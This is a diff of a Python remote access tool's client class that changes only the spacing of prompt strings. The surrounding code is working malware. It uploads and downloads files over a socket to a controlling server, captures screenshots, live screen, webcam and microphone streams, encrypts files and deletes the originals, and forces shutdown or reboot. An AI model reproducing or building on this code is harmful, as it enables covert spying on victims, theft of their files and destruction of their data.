@@ -36,9 +36,9 @@ class GeneralFeatures:
                 conn.send(usrFile.encode())
                 # checks if file exists
                 if not os.path.exists(usrFile):
-                    conn.send(f"[-]File does not exist! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    conn.send(f"[-]File does not exist! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                 else:
-                    conn.send(self.convert_caesar_text('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                     time.sleep(1)
                     fileSize = os.path.getsize(usrFile)
                     conn.send(str(fileSize).encode())
@@ -57,7 +57,7 @@ class GeneralFeatures:
                                 data = file.read(1024)
                             file.close()
             except:
-                conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
 
         # receives file from server
@@ -67,7 +67,7 @@ class GeneralFeatures:
 
                 if fileSize == 0:  # if file is empty do nothing
                     # send current working directory back to server
-                    conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                 else:
                     with open(usrFile, 'wb') as file:
                         if fileSize < 1024:
@@ -84,15 +84,15 @@ class GeneralFeatures:
                                 data = conn.recv(1024)
                             file.write(data)
                             file.close()
-                    conn.send(f"[+]File successfully sent to client! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    conn.send(f"[+]File successfully sent to client! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             except:
-                conn.send(f"[-]Error occurred sending file! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                conn.send(f"[-]Error occurred sending file! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
 
         # sends screenshot back to server
         def screenshot(self, conn):
             try:
-                conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())  # send current working directory back to server
+                conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())  # send current working directory back to server
                 img = ImageGrab.grab()  # capture image
                 img_np = np.array(img)
                 frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
@@ -117,7 +117,7 @@ class GeneralFeatures:
 
         #sends live feed of screen recording back to server
         def live_screen_feed(self, conn):
-            conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+            conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             img_counter = 0
             try:
                 while True:
@@ -139,7 +139,7 @@ class GeneralFeatures:
 
         # sends live feed of webcam back to server
         def capture_webcam_video(self, conn):
-            conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+            conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             cam = cv2.VideoCapture(0)
 
             img_counter = 0
@@ -170,7 +170,7 @@ class GeneralFeatures:
 
         #sends camshot from webcam back to server
         def webcam_capture(self, conn):
-            conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+            conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
             try:
                 capture = cv2.VideoCapture(0)
@@ -224,9 +224,9 @@ class GeneralFeatures:
                                 outfile.write(encrypt_file.encrypt(block))  # encrypt block
                             usrFile.close()
                         os.remove(filename)
-                    conn.send(f"[+]File has been encrypted! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    conn.send(f"[+]File has been encrypted! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                 else:
-                    conn.send(f"[-]File encryption unsuccessful! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    conn.send(f"[-]File encryption unsuccessful! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             except Exception as e:
                 conn.send(f"[-]{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
 
@@ -257,17 +257,17 @@ class GeneralFeatures:
                             decrypted_file.truncate(filesize)
 
                     os.remove(filename)
-                    conn.send(f"[+]File has been decrypted! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    conn.send(f"[+]File has been decrypted! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                 else:
-                    conn.send(f"[-]File does not exist! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    conn.send(f"[-]File does not exist! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             except Exception as e:
-                conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
 
         #send microphone audio stream back to the server
         def live_audio_feed(self, conn):
             try:
-                conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
                 chunk = 20000
                 FORMAT = pyaudio.paInt16
@@ -296,17 +296,16 @@ class GeneralFeatures:
                 pass
 
 
-
         #shut down system
         def shutdown(self, conn):
             try:
                 os.system("shutdown /s /t 0")
             except Exception as e:
-                conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
         #reboot system
         def reboot(self, conn):
             try:
                 os.system("shutdown -t 0 -r -f")
             except Exception as e:
-                conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
